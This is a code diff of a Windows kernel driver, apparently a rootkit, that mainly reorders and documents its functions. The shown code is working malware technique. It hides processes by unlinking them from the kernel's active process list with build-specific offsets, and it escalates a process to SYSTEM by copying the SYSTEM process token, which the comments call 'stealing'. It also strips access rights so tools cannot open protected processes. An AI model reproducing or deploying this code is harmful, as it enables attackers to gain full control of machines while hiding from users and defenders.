@@ -8,24 +8,80 @@
 #define PROCESS_VM_READ 0x10
 #define PROCESS_VM_OPERATION 8
 
-// Prototypes.
-bool FindProcess(ULONG pid);
-bool AddProcess(ULONG pid);
-bool RemoveProcess(ULONG pid);
-ULONG GetActiveProcessLinksOffset();
-VOID RemoveProcessLinks(PLIST_ENTRY current);
-NTSTATUS HideProcess(ULONG pid);
-UINT64 GetTokenOffset();
-NTSTATUS ElevateProcess(ULONG targetPid);
+/*
+* Description:
+* FindProcess is responsible for searching if a process exists in the list of protected processes.
+*
+* Parameters:
+* @pid	  [ULONG] -- PID to search.
+*
+* Returns:
+* @status [bool]  -- Whether found or not.
+*/
+bool FindProcess(ULONG pid) {
+	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
+		if (pGlobals.Processes.Pids[i] == pid)
+			return true;
+	return false;
+}
 
-/* -------------------------------------------------------------------------------------------------------------------------------------------- */
+/*
+* Description:
+* AddProcess is responsible for adding a process to the list of protected processes.
+*
+* Parameters:
+* @pid	  [ULONG] -- PID to add.
+*
+* Returns:
+* @status [bool]  -- Whether successfully added or not.
+*/
+bool AddProcess(ULONG pid) {
+	for (int i = 0; i < MAX_PIDS; i++)
+		if (pGlobals.Processes.Pids[i] == 0) {
+			pGlobals.Processes.Pids[i] = pid;
+			pGlobals.Processes.PidsCount++;
+			return true;
+		}
+	return false;
+}
 
+/*
+* Description:
+* RemoveProcess is responsible for remove a process from the list of protected processes.
+*
+* Parameters:
+* @pid	  [ULONG] -- PID to remove.
+*
+* Returns:
+* @status [bool]  -- Whether successfully removed or not.
+*/
+bool RemoveProcess(ULONG pid) {
+	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
+		if (pGlobals.Processes.Pids[i] == pid) {
+			pGlobals.Processes.Pids[i] = 0;
+			pGlobals.Processes.PidsCount--;
+			return true;
+		}
+	return false;
+}
+
+/*
+* Description:
+* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
+*
+* Parameters:
+* @RegistrationContext [PVOID]						   -- Unused.
+* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
+*
+* Returns:
+* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
+*/
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID /* RegistrationContext */, POB_PRE_OPERATION_INFORMATION Info) {
 	if (Info->KernelHandle)
 		return OB_PREOP_SUCCESS;
 
-	auto process = (PEPROCESS)Info->Object;
-	auto pid = HandleToULong(PsGetProcessId(process));
+	auto Process = (PEPROCESS)Info->Object;
+	auto pid = HandleToULong(PsGetProcessId(Process));
 
 	AutoLock locker(pGlobals.Lock);
 
@@ -41,35 +97,93 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID /* RegistrationContext */, POB_P
 	return OB_PREOP_SUCCESS;
 }
 
-bool FindProcess(ULONG pid) {
-	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
-		if (pGlobals.Processes.Pids[i] == pid)
-			return true;
-	return false;
-}
+/*
+* Description:
+* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @activeProcessLinks [ULONG] -- Offset of active process links.
+*/
+ULONG GetActiveProcessLinksOffset() {
+	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
+	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
+	NTSTATUS result = RtlGetVersion(&osVersion);
 
-bool AddProcess(ULONG pid) {
-	for (int i = 0; i < MAX_PIDS; i++)
-		if (pGlobals.Processes.Pids[i] == 0) {
-			pGlobals.Processes.Pids[i] = pid;
-			pGlobals.Processes.PidsCount++;
-			return true;
+	if (NT_SUCCESS(result)) {
+		switch (osVersion.dwBuildNumber) {
+		case 10240:
+		case 10586:
+		case 14393:
+		case 18362:
+		case 18363:
+			activeProcessLinks = 0x2f0;
+			break;
+		case 15063:
+		case 16299:
+		case 17134:
+		case 17763:
+			activeProcessLinks = 0x2e8;
+			break;
+		default:
+			activeProcessLinks = 0x448;
+			break;
 		}
-	return false;
+	}
+		
+	return activeProcessLinks;
 }
 
-bool RemoveProcess(ULONG pid) {
-	for (int i = 0; i < pGlobals.Processes.PidsCount; i++)
-		if (pGlobals.Processes.Pids[i] == pid) {
-			pGlobals.Processes.Pids[i] = 0;
-			pGlobals.Processes.PidsCount--;
-			return true;
-		}
-	return false;
+/*
+* Description:
+* RemoveProcessLinks is responsible for modifying the list by connecting the previous entry to the next entry and by 
+* that "removing" the current entry.
+*
+* Parameters:
+* @current [PLIST_ENTRY] -- Current process entry.
+*
+* Returns:
+* There is no return value.
+*/
+void RemoveProcessLinks(PLIST_ENTRY current) {
+	PLIST_ENTRY previous, next;
+
+	/*
+	* Changing the list from:
+	* Prev <--> Current <--> Next
+	* 
+	* To:
+	* 
+	*   | ----------------------------------
+	*   v										|
+	* Prev        Current            Next
+	*   |									   ^
+	*   ---------------------------------- |
+	*/ 
+
+	previous = (current->Blink);
+	next = (current->Flink);
+
+	previous->Flink = next;
+	next->Blink = previous;
+
+	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
+	current->Blink = (PLIST_ENTRY)&current->Flink;
+	current->Flink = (PLIST_ENTRY)&current->Flink;
 }
 
-/* -------------------------------------------------------------------------------------------------------------------------------------------- */
-
+/*
+* Description:
+* HideProcess is responsible for hiding a process by modifying the process list.
+*
+* Parameters:
+* @pid	  [ULONG]	 -- PID to hide.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully hidden or not.
+*/
 NTSTATUS HideProcess(ULONG pid) {
 	// Getting the offset depending on the OS version.
 	ULONG pidOffset = GetActiveProcessLinksOffset();
@@ -110,88 +224,16 @@ NTSTATUS HideProcess(ULONG pid) {
 	return STATUS_SUCCESS;
 }
 
-ULONG GetActiveProcessLinksOffset() {
-	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
-	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
-	NTSTATUS result = RtlGetVersion(&osVersion);
-
-	if (NT_SUCCESS(result)) {
-		switch (osVersion.dwBuildNumber) {
-		case 10240:
-		case 10586:
-		case 14393:
-		case 18362:
-		case 18363:
-			activeProcessLinks = 0x2f0;
-			break;
-		case 15063:
-		case 16299:
-		case 17134:
-		case 17763:
-			activeProcessLinks = 0x2e8;
-			break;
-		default:
-			activeProcessLinks = 0x448;
-			break;
-		}
-	}
-		
-	return activeProcessLinks;
-}
-
-VOID RemoveProcessLinks(PLIST_ENTRY current) {
-	PLIST_ENTRY previous, next;
-
-	/*
-	* Changing the list from:
-	* Prev <--> Current <--> Next
-	* 
-	* To:
-	* 
-	*   | ----------------------------------
-	*   v										|
-	* Prev        Current            Next
-	*   |									   ^
-	*   ---------------------------------- |
-	*/ 
-
-	previous = (current->Blink);
-	next = (current->Flink);
-
-	previous->Flink = next;
-	next->Blink = previous;
-
-	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
-	current->Blink = (PLIST_ENTRY)&current->Flink;
-	current->Flink = (PLIST_ENTRY)&current->Flink;
-}
-
-/* -------------------------------------------------------------------------------------------------------------------------------------------- */
-
-NTSTATUS ElevateProcess(ULONG targetPid) {
-	PEPROCESS privilegedProcess, targetProcess;
-	NTSTATUS status = STATUS_SUCCESS;
-
-	// Getting the EProcess of the target and the privileged processes.
-	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
-	UINT64 tokenOffset = GetTokenOffset();
-
-	if (!NT_SUCCESS(status))
-	{
-		return status;
-	}
-	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
-
-	if (!NT_SUCCESS(status))
-	{
-		return status;
-	}
-
-	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);
-
-	return status;
-}
-
+/*
+* Description:
+* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @tokenOffset [UINT64] -- Offset of the main thread's token.
+*/
 UINT64 GetTokenOffset() {
 	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
@@ -221,4 +263,39 @@ UINT64 GetTokenOffset() {
 	return tokenOffset;
 }
 
-/* -------------------------------------------------------------------------------------------------------------------------------------------- */
+/*
+* Description:
+* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
+*
+* Parameters:
+* @pid	  [ULONG]	 -- PID to elevate.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully elevated or not.
+*/
+NTSTATUS ElevateProcess(ULONG targetPid) {
+	PEPROCESS privilegedProcess, targetProcess;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	// Getting the EProcess of the target and the privileged processes.
+	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
+	UINT64 tokenOffset = GetTokenOffset();
+
+	if (!NT_SUCCESS(status))
+	{
+		return status;
+	}
+	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
+
+	if (!NT_SUCCESS(status))
+	{
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);
+
+	ObDereferenceObject(privilegedProcess);
+	ObDereferenceObject(targetProcess);
+	return status;
+}
